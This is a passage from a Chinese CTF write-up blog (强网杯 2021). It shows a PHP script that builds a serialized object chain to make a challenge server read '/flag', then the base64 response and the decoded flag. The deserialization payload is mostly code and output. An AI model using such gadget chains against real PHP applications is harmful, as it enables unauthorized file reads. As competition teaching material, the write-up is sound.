<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> Info();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>] = <span class="keyword">new</span> Room();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;a = <span class="keyword">new</span> Room();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> Start());</span><br></pre></td></tr></table></figure>

<p>将得到的载荷以 GET 参数 hello 发送请求即可得到如下字符串。</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3s3MzcxOGIzMy03OWRlLTQyZmMtOWZkMi02MmEyZGE1NjJlMWN9</span><br></pre></td></tr></table></figure>

<p>将其 Base64 解码一次即可得到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;73718b33-79de-42fc-9fd2-62a2da562e1c&#125;</span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/writeups/">WriteUps</a></li>
         
          <li><a href="/tools/">工具</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BlueTeaming"><span class="toc-number">1.1.</span> <span class="toc-text">BlueTeaming</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CipherMan"><span class="toc-number">1.2.</span> <span class="toc-text">CipherMan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EzTime"><span class="toc-number">1.3.</span> <span class="toc-text">EzTime</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ISO1995"><span class="toc-number">1.4.</span> <span class="toc-text">ISO1995</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ExtremelySlow"><span class="toc-number">1.5.</span> <span class="toc-text">ExtremelySlow</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EasyWeb"><span class="toc-number">2.1.</span> <span class="toc-text">EasyWeb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hard-Penetration"><span class="toc-number">2.2.</span> <span class="toc-text">Hard_Penetration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pop-master"><span class="toc-number">2.3.</span> <span class="toc-text">pop_master</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WhereIsUWebShell"><span class="toc-number">2.4.</span> <span class="toc-text">WhereIsUWebShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-%E8%B5%8C%E5%BE%92"><span class="toc-number">2.5.</span> <span class="toc-text">[强网先锋]赌徒</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&text=强网杯 2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&title=强网杯 2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&is_video=false&description=强网杯 2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=强网杯 2021&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/1ff2873c.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&title=强网杯 2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&title=强网杯 2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&title=强网杯 2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&title=强网杯 2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&name=强网杯 2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/1ff2873c.html&t=强网杯 2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/writeups/">WriteUps</a></li>
         
          <li><a href="/tools/">工具</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
        
        
        <li>
        
          <a href="#">简</a>
        
          <a href="/en">En</a>
        
          <a href="/zh-TW">正</a>
        
        </li>
      </ul>
    </nav>
  </div>
  <div class="footer-left">
    Copyright &copy;
    
    
    2018-2021
    LemonPrefect
    
      <a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/">湘ICP备20002800号</a>
    
    
      <img no-lazy src="/images/beian.png"/>
      <a href= "http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=43021102000188">湘公网安备43021102000188号</a>
    
    
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.3/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.8/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


<script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 2,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(i){i.imageLazyLoadSetting.processImages=a;var n=i.imageLazyLoadSetting.isSPA,o=i.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function a(){n&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,e,a=0;a<r.length;a++)t=r[a],e=void 0,0<=(e=t.getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(i.innerHeight*o||document.documentElement.clientHeight*o)&&function(){var t,e,i,n,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},i=new Image,n=t.getAttribute("data-original"),i.onload=function(){t.src=n,e&&e()},t.src!==n&&(i.src=n)}()}a(),i.addEventListener("scroll",function(){var t,e;t=a,e=i,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
</html>
